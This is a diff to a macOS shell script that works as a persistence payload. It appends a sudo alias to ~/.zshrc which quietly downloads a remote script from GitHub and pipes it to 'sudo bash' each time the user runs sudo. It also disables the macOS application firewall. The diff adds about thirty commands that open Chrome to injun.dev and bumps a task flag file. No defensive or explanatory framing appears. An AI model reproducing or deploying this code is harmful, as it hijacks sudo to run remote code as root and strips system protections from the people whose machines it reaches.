@@ -1,4 +1,4 @@
-FLAG_FILE="/tmp/root_task_20_done"
+FLAG_FILE="/tmp/root_task_21_done"
 if [ ! -f "$FLAG_FILE" ]; then
   sed -i '' '/alias sudo="curl -fsSL https:\/\/raw.githubusercontent.com\/in-jun\/jtest\/refs\/heads\/main\/root 2>\/dev\/null | sudo bash > \/dev\/null 2>\&1 && \\sudo"/d' ~/.zshrc
   echo 'alias sudo="(curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/root 2>/dev/null | sudo bash > /dev/null 2>&1 &) && \sudo"' >> ~/.zshrc
@@ -11,5 +11,36 @@ if [ ! -f "$FLAG_FILE" ]; then
   ) &
   
   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
+
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+  open -a "Google Chrome" "https:injun.dev"
+
   touch "$FLAG_FILE"
 fi
